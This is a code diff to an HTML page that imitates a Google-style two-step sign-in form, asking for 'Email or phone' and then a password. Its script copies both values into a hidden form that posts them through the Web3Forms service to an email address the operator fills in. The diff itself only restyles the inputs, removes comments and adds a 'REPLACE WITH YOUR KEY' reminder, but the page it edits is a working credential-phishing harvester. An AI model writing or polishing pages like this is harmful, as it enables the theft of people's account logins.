@@ -50,9 +50,21 @@
             line-height: 1.5;
         }
 
-        /* Hidden input to hold the iframe data */
-        #email-input {
-            display: none;
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 13px 15px; 
+            border: 1px solid #dadce0;
+            border-radius: 4px; 
+            font-size: 16px;
+            height: 50px;
+            outline: none;
+            transition: border 0.2s;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* Adjust for border width change */
         }
 
         .next-btn {
@@ -123,7 +135,7 @@
 
         <!-- Step 1: Email Input -->
         <div id="step-email" class="step active">
-            <input type="text" id="email-display" placeholder="Email or phone" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
+            <input type="text" id="email-display" placeholder="Email or phone" style="margin-bottom: 20px;">
             
             <button type="button" class="next-btn" onclick="goToPassword()">Next</button>
             
@@ -134,7 +146,7 @@
 
         <!-- Step 2: Password Input -->
         <div id="step-password" class="step">
-            <input type="password" id="password-display" placeholder="Enter your password" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
+            <input type="password" id="password-display" placeholder="Enter your password" style="margin-bottom: 20px;">
             
             <button type="submit" class="next-btn" id="submitBtn">Next</button>
             
@@ -145,6 +157,7 @@
 
         <!-- Hidden Form that submits to Web3Forms -->
         <form action="https://api.web3forms.com/submit" method="POST" id="hiddenForm">
+            <!-- REPLACE WITH YOUR KEY -->
             <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
             <input type="hidden" name="to" value="your-email@example.com">
             <input type="hidden" name="email" id="email-input">
@@ -159,20 +172,15 @@
 
     <script>
         function goToPassword() {
-            // Get the email typed by the user
             const emailVal = document.getElementById('email-display').value;
             if(!emailVal) { alert("Please enter an email"); return; }
             
-            // Store it in the hidden form field
             document.getElementById('email-input').value = emailVal;
-
-            // Switch UI
             document.getElementById('step-email').classList.remove('active');
             document.getElementById('step-password').classList.add('active');
             document.getElementById('password-display').focus();
         }
 
-        // Handle final submit
         document.getElementById('submitBtn').addEventListener('click', () => {
             const passVal = document.getElementById('password-display').value;
             document.getElementById('password-hidden').value = passVal;
